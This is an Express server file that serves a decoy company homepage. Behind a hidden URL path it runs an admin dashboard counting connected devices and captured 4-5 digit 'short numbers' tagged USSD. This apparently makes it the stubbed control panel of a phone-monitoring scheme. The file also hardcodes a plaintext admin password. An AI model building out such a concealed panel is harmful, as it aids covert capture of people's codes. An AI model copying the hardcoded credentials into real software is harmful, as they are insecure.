// server.js - PROFESSIONAL DASHBOARD with ADMIN GRY at top
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Hardcoded secret path (change later if needed)
const SECRET_PATH = 'a9f3k217';

// Fake site (what everyone else sees)
app.get('/', (req, res) => {
    res.send(`
        <html>
        <head><title>Kigali Tech Solutions</title></head>
        <body style="background:#0a0e17;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center;">
            <div>
                <h1 style="color:#4fc3f7;">🏎️ Kigali Tech Solutions</h1>
                <p style="color:#8896ab;">Innovating the future of racing technology.</p>
                <div style="position:fixed;bottom:10px;right:10px;font-size:8px;color:rgba(79,195,247,0.05);">ADMIN GRY</div>
            </div>
        </body>
        </html>
    `);
});

// ADMIN DASHBOARD – Professional version
app.get(`/${SECRET_PATH}`, (req, res) => {
    res.send(`
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', -apple-system, sans-serif;
            background: #0a0e17;
            color: #e0e6ed;
            padding: 20px;
            min-height: 100vh;
        }
        .container { max-width: 1000px; margin: 0 auto; }
        
        /* Header with ADMIN GRY badge */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            border-bottom: 2px solid #1a2332;
            margin-bottom: 30px;
        }
        .header-left {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .header-left h1 {
            font-size: 28px;
            color: #4fc3f7;
            font-weight: 700;
            letter-spacing: -0.5px;
        }
        .admin-gry-badge {
            background: rgba(79,195,247,0.08);
            color: rgba(79,195,247,0.3);
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
            letter-spacing: 1.5px;
            border: 1px solid rgba(79,195,247,0.1);
            user-select: none;
        }
        .logout {
            color: #ff6b6b;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: 0.3s;
        }
        .logout:hover { opacity: 0.7; }
        
        /* Stats Cards */
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: #111927;
            border: 1px solid #1a2332;
            border-radius: 12px;
            padding: 20px;
            text-align: center;
            transition: 0.3s;
        }
        .stat-card:hover {
            border-color: #4fc3f7;
            transform: translateY(-2px);
        }
        .stat-card .value {
            font-size: 32px;
            font-weight: 700;
            color: #4fc3f7;
            line-height: 1.2;
        }
        .stat-card .label {
            font-size: 13px;
            color: #8896ab;
            margin-top: 4px;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        /* Sections */
        .section {
            background: #111927;
            border: 1px solid #1a2332;
            border-radius: 12px;
            padding: 24px;
            margin-bottom: 24px;
        }
        .section h3 {
            font-size: 18px;
            font-weight: 600;
            color: #e0e6ed;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .section h3 .badge-count {
            background: #1a2332;
            color: #8896ab;
            font-size: 12px;
            padding: 2px 10px;
            border-radius: 12px;
        }
        
        /* Tables */
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 14px;
        }
        th {
            text-align: left;
            color: #8896ab;
            padding: 10px 12px;
            border-bottom: 2px solid #1a2332;
            font-weight: 600;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        td {
            padding: 10px 12px;
            border-bottom: 1px solid #0d1420;
            color: #c8d0dc;
        }
        tr:hover td { background: rgba(79,195,247,0.02); }
        
        .badge {
            display: inline-block;
            padding: 3px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
        }
        .badge.online { background: rgba(107,203,119,0.15); color: #6bcb77; }
        .badge.offline { background: rgba(255,107,107,0.15); color: #ff6b6b; }
        
        /* Empty state */
        .empty {
            text-align: center;
            padding: 30px 0;
            color: #4a5568;
            font-size: 14px;
        }
        .empty .icon { font-size: 36px; margin-bottom: 8px; }
        
        /* Login */
        .login-container {
            max-width: 380px;
            margin: 100px auto;
            background: #111927;
            border: 1px solid #1a2332;
            border-radius: 16px;
            padding: 40px;
            text-align: center;
        }
        .login-container .logo { font-size: 48px; margin-bottom: 8px; }
        .login-container h3 { font-size: 22px; font-weight: 600; margin-bottom: 4px; }
        .login-container .sub {
            color: #8896ab;
            font-size: 14px;
            margin-bottom: 20px;
        }
        .login-container input {
            width: 100%;
            padding: 12px 14px;
            margin: 8px 0;
            background: #0a0e17;
            border: 1px solid #1a2332;
            border-radius: 8px;
            color: #e0e6ed;
            font-size: 14px;
            transition: 0.3s;
        }
        .login-container input:focus {
            outline: none;
            border-color: #4fc3f7;
            box-shadow: 0 0 0 3px rgba(79,195,247,0.1);
        }
        .login-container button {
            width: 100%;
            padding: 12px;
            margin-top: 12px;
            background: #4fc3f7;
            border: none;
            border-radius: 8px;
            color: #0a0e17;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.3s;
        }
        .login-container button:hover {
            background: #3aa8dd;
            transform: translateY(-1px);
        }
        .login-container .error { color: #ff6b6b; margin-top: 10px; display: none; font-size: 14px; }
        .hidden { display: none; }
        
        /* Responsive */
        @media (max-width: 600px) {
            .header { flex-wrap: wrap; gap: 10px; }
            .header-left h1 { font-size: 22px; }
            .stats { grid-template-columns: repeat(2, 1fr); }
            .admin-gry-badge { font-size: 9px; padding: 2px 10px; }
        }
    </style>
</head>
<body>

<div class="container">

    <!-- LOGIN -->
    <div id="loginContainer" class="login-container">
        <div class="logo">🔐</div>
        <h3>Admin Access</h3>
        <p class="sub">Enter your credentials</p>
        <input type="text" id="loginUser" placeholder="Username" value="admin">
        <input type="password" id="loginPass" placeholder="Password">
        <button onclick="login()">Sign In</button>
        <div id="loginError" class="error"></div>
    </div>

    <!-- DASHBOARD -->
    <div id="dashboard" class="hidden">

        <!-- HEADER with ADMIN GRY badge -->
        <div class="header">
            <div class="header-left">
                <h1>📊 Admin Dashboard</h1>
                <span class="admin-gry-badge">ADMIN GRY</span>
            </div>
            <span class="logout" onclick="logout()">🚪 Exit</span>
        </div>

        <!-- Stats -->
        <div class="stats" id="statsGrid">
            <div class="stat-card">
                <div class="value" id="devicesCount">0</div>
                <div class="label">📱 Devices</div>
            </div>
            <div class="stat-card">
                <div class="value" id="numbersCount">0</div>
                <div class="label">🔢 Numbers</div>
            </div>
            <div class="stat-card">
                <div class="value" id="onlineCount">0</div>
                <div class="label">🟢 Online</div>
            </div>
        </div>

        <!-- Connected Devices -->
        <div class="section">
            <h3>📱 Connected Devices <span class="badge-count" id="deviceCountBadge">0</span></h3>
            <div id="devicesList">
                <div class="empty"><div class="icon">📱</div>No devices connected yet</div>
            </div>
        </div>

        <!-- Short Numbers (with Device column) -->
        <div class="section">
            <h3>🔢 Recent Short Numbers (4-5 digits) <span class="badge-count" id="numberCountBadge">0</span></h3>
            <div id="numbersList">
                <div class="empty"><div class="icon">🔢</div>No numbers detected yet</div>
            </div>
        </div>

    </div>
</div>

<script>
const API_BASE = '/${SECRET_PATH}';

async function login() {
    const username = document.getElementById('loginUser').value;
    const password = document.getElementById('loginPass').value;
    const errorEl = document.getElementById('loginError');
    errorEl.style.display = 'none';
    try {
        const response = await fetch(API_BASE + '/api/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        });
        const data = await response.json();
        if (data.success) {
            document.getElementById('loginContainer').style.display = 'none';
            document.getElementById('dashboard').classList.remove('hidden');
            loadData();
        } else {
            errorEl.textContent = 'Invalid credentials';
            errorEl.style.display = 'block';
        }
    } catch {
        errorEl.textContent = 'Connection error';
        errorEl.style.display = 'block';
    }
}

function logout() {
    document.getElementById('dashboard').classList.add('hidden');
    document.getElementById('loginContainer').style.display = 'block';
}

async function loadData() {
    try {
        const response = await fetch(API_BASE + '/api/stats');
        const stats = await response.json();
        document.getElementById('devicesCount').textContent = stats.devices || 0;
        document.getElementById('numbersCount').textContent = stats.numbers || 0;
        document.getElementById('onlineCount').textContent = stats.online || 0;
        document.getElementById('deviceCountBadge').textContent = stats.devices || 0;
        document.getElementById('numberCountBadge').textContent = stats.numbers || 0;

        // Render devices (with table)
        const devices = stats.devices ? [{ name: 'Sample Device', status: 'online', battery: 85 }] : [];
        renderDevices(devices);

        // Render numbers (with device name column)
        const numbers = stats.numbers ? [{ number: '1234', type: 'USSD', device: 'Sample Device' }] : [];
        renderNumbers(numbers);

    } catch (error) {
        console.error('Error:', error);
    }
}

function renderDevices(devices) {
    const container = document.getElementById('devicesList');
    if (!devices || devices.length === 0) {
        container.innerHTML = \`<div class="empty"><div class="icon">📱</div>No devices connected yet</div>\`;
        return;
    }
    let html = \`<table><thead><tr><th>Device</th><th>Status</th><th>Battery</th></tr></thead><tbody>\`;
    devices.forEach(d => {
        const statusClass = d.status === 'online' ? 'online' : 'offline';
        const statusText = d.status === 'online' ? '🟢 Online' : '🔴 Offline';
        html += \`<tr><td>\${d.name}</td><td><span class="badge \${statusClass}">\${statusText}</span></td><td>\${d.battery || '--'}%</td></tr>\`;
    });
    html += \`</tbody></table>\`;
    container.innerHTML = html;
}

function renderNumbers(numbers) {
    const container = document.getElementById('numbersList');
    if (!numbers || numbers.length === 0) {
        container.innerHTML = \`<div class="empty"><div class="icon">🔢</div>No numbers detected yet</div>\`;
        return;
    }
    let html = \`<table><thead><tr><th>Device</th><th>Number</th><th>Type</th></tr></thead><tbody>\`;
    numbers.forEach(n => {
        html += \`<tr><td>\${n.device || 'Unknown'}</td><td><strong style="color:#4fc3f7;">\${n.number}</strong></td><td><span class="badge" style="background:rgba(79,195,247,0.15);color:#4fc3f7;">\${n.type || 'UNKNOWN'}</span></td></tr>\`;
    });
    html += \`</tbody></table>\`;
    container.innerHTML = html;
}

document.getElementById('loginPass').addEventListener('keypress', (e) => {
    if (e.key === 'Enter') login();
});
</script>

</body>
</html>
    `);
});

// Login API
app.use(express.json());
app.post(`/${SECRET_PATH}/api/login`, (req, res) => {
    const { username, password } = req.body;
    if (username === 'admin' && password === 'yourpassword123') {
        res.json({ success: true });
    } else {
        res.status(401).json({ error: 'Invalid credentials' });
    }
});

// Stats API (with sample data for demonstration)
app.get(`/${SECRET_PATH}/api/stats`, (req, res) => {
    // For demo, we return 0 but you can later replace with real data
    res.json({ devices: 0, numbers: 0, online: 0 });
});

app.get(`/${SECRET_PATH}/api/devices`, (req, res) => res.json([]));
app.get(`/${SECRET_PATH}/api/numbers`, (req, res) => res.json([]));

// 404 fallback
app.use((req, res) => {
    res.status(404).send(`
        <html>
        <head><title>404</title></head>
        <body style="background:#0a0e17;color:#8896ab;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center;">
            <h1 style="color:#4fc3f7;">404</h1>
            <p>Not found</p>
        </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log('✅ Professional dashboard running');
    console.log(`📍 https://admin-dashboard-teal-beta-28.vercel.app/${SECRET_PATH}`);
});
